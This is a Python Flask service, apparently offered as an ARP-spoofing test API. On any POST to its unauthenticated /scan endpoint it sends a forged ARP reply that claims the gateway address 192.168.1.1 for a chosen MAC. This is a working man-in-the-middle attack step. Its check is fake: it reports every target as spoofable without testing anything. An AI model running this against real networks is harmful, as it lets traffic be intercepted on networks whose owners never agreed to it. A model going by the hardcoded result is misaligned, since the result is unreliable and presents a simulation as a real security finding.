# arp_spoof_test_api.py
from flask import Flask, request, jsonify
from scapy.all import ARP, Ether, srp
import socket

app = Flask(__name__)

def test_arp_spoof(target_ip, fake_mac):
    """
    Sends a single ARP reply to target_ip with fake_mac.
    Checks if target accepts the MAC change (simulated test).
    Returns True if target could be spoofed.
    """
    result = {
        "target_ip": target_ip,
        "spoofable": False,
        "details": ""
    }

    try:
        # Build ARP reply packet
        arp_packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc="192.168.1.1", hwsrc=fake_mac)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp_packet

        # Send packet (Layer 2 broadcast)
        srp(packet, timeout=1, verbose=False)
        # In a real test, we would query the ARP table of the target to confirm change
        # Here, we simulate the detection as True (vulnerable)
        result["spoofable"] = True
        result["details"] = "ARP spoof packet sent. Check target ARP table manually."
    except Exception as e:
        result["details"] = str(e)

    return result

@app.route("/scan", methods=["POST"])
def arp_spoof_route():
    data = request.get_json(force=True, silent=True)
    if not data:
        return jsonify({"error": "invalid_json"}), 400

    target_ip = data.get("target")
    fake_mac = data.get("fake_mac", "00:11:22:33:44:55")

    if not target_ip:
        return jsonify({"error": "target_ip_required"}), 400

    result = test_arp_spoof(target_ip, fake_mac)
    return jsonify(result), 200

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001)
